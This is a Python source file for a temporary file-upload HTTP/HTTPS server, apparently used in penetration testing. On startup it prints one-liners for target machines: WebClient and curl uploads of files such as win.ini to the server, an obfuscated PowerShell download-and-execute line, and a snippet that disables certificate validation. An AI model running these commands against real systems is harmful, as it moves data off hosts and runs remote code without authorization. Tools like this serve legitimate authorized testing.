# https://github.com/tarunKoyalwar/TempUpServer
from http.server import HTTPServer , CGIHTTPRequestHandler
from Cryptodome.PublicKey import RSA
import os
import re
import cgi
import ssl
import argparse
import socket
import fcntl
import struct
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.x509.oid import NameOID
from cryptography import x509
from datetime import datetime, timedelta
seperator = '/'
if os.name == 'nt':
    seperator = '\\'

blacklist = ['py','ipynb']

workingdir = None

upload_page = """
         <html>
         <body>
            <h3>File:</h3> 
            <form method="POST" action = "webserver.py" enctype="multipart/form-data">
                  <input type='file' name='filename'><br>
                  <input type='submit' name='upload'><br>
            </form>
         </body>
         </html>
    """

class requesthandler(CGIHTTPRequestHandler):
    def do_GET(self):
        if self.path.endswith('/upload'):
            self.send_response(200)
            self.send_header("content-type",'text/html')
            self.end_headers()
            self.wfile.write(upload_page.encode())
        else:
            self.send_response(200)
            self.send_header("content-type",'text/html')
            self.end_headers()
            filename = os.path.basename(self.path)
            if os.path.isfile(filename):
                content = (open(filename, 'rb')).read()
                self.wfile.write(content) 
            else:
                self.wfile.write(b'Not Found') 


    def deal_post_data(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'],})
        # print(form)
        if 'file' in form:
            fileitem = form['file']
        else:
            fileitem = form['filename']

        # Test if the file was uploaded
        if fileitem.filename:
             # strip leading path from file name to avoid errors/ path traversal
            fn = os.path.basename(fileitem.filename)
            # print(fn)
            try:
                extension = fn.split('.')[-1]
                if extension in blacklist:
                    print("Extension  is Blacklisted!!")
                    return False
            except IndexError:
                pass
            data =fileitem.file.read()
            # print(data)
            with open(workingdir+seperator+fn,'wb') as file:
                file.write(data)
                print(f"File uploded at {workingdir+seperator+fn} by POST from {self.client_address}")
            return True
        else:
            return False

    def do_POST(self):
        status = self.deal_post_data()
        self.send_response(200)
        self.send_header("content-type",'text/html')
        self.end_headers()
        if status:
            self.wfile.write('Success'.encode())
        else:
            self.wfile.write('Failed'.encode())


def get_ip_address_by_inet_name(network_interface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', network_interface[:15])
    )[20:24])

def main(IP,PORT,dir, enable_ssl, bindall, cn=None):
    
    if enable_ssl:
        if cn is not None:
            gen_ssl_certificate(cn)
        else:
            gen_ssl_certificate(IP)
    
    cwd = os.path.dirname(os.path.abspath(__file__))
    listen_ip = IP
    if bindall:
        listen_ip = '0.0.0.0'

    server = HTTPServer((listen_ip,PORT),requesthandler)

    scheme = 'http'
    if enable_ssl:
        sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        sslctx.check_hostname = False # If set to True, only the hostname that matches the certificate will be accepted
        sslctx.load_cert_chain('certchain.pem', 'private.key')
        server.socket = sslctx.wrap_socket(server.socket, server_side=True)
        scheme ='https'

    http_server_url = f'{scheme}://{IP}:{PORT}/'
    print(f"[*] Server Running on {scheme}://{listen_ip}:{PORT}")
    print(f"[*] Files will be saved at {dir}")
    
    upload_ps = (open(f'{cwd}/template/Invoke-Upload.ps1', 'r')).read().replace('{{http_server_url}}', http_server_url)
    (open(f'{cwd}/Invoke-Upload.ps1', 'w')).write(upload_ps)
    if enable_ssl:
        print('[*] Windows skip ssl validation for Invoke-WebRequest')
        print('''add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n''')

    print('[*] Windows: (Choose one. 1 and 2 need to skip ssl validation)')


    print(f"\t1. $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('{http_server_url}', 'C:\Windows\win.ini')")
    print(f"\t2. i`e`x(iWr -UsEbaSIcparSING {http_server_url}Invoke-Upload.ps1); Invoke-Upload 'C:\Windows\win.ini'\n")
    
    print('\t# Supported on Windows 10 version 1803 and later.')
    print(f'\t3. cmd /c curl -k {http_server_url} -F file=@FILENAME\n')
    
    print('[*] Linux or Windows 10 version 1803 later')
    print(f'\tcurl -k {http_server_url} -F file=@FILANME\n')

    server.serve_forever()

def gen_ssl_certificate(domain_or_ip):
    # Generate RSA private key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Save private key to file
    with open("private.key", "wb") as private_key_file:
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        private_key_file.write(private_key_pem)

    # Generate self-sign certificate
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, domain_or_ip),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME , u'UploadServer'),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, u'UploadServer')
    ])

    not_valid_before = datetime.utcnow()
    not_valid_after = not_valid_before + timedelta(days=365)

    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        private_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        not_valid_before
    ).not_valid_after(
        not_valid_after
    ).sign(private_key, hashes.SHA256(), default_backend())

    # Save to file
    with open("certchain.pem", "wb") as cert_file:
        cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
        cert_file.write(cert_pem)

if __name__ == '__main__':
    parser=argparse.ArgumentParser(description="A Simple http server to upload for temporary use")
    parser.add_argument('-i','--ip',help="IP or network interface", default='0.0.0.0')
    parser.add_argument('-p','--port',help="Port to use avoid using 80,443 for non root user",default=8080)
    parser.add_argument('-d','--directory',help="Working Directory", default=os.getcwd())
    parser.add_argument('-ssl','--ssl',help="Enable HTTPS", default=False, action='store_true')
    parser.add_argument('-bindall','--bindall',help="Bind on all network interface", default=False, action='store_true')
    parser.add_argument('-cn','--common-name',help="Certificate common name", default=None)
    args = parser.parse_args()
    
    enable_ssl = args.ssl
    workingdir = args.directory
    bindall = args.bindall
    port = args.port
    cn = args.common_name

    if not os.path.isdir(workingdir):
        os.mkdir(workingdir)

    if not re.findall('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', args.ip):
        # Network interface name
        IP = get_ip_address_by_inet_name(args.ip.encode('utf-8'))
    else:
        # IP
        IP = args.ip

    main(IP, int(port),args.directory, enable_ssl, bindall, cn)

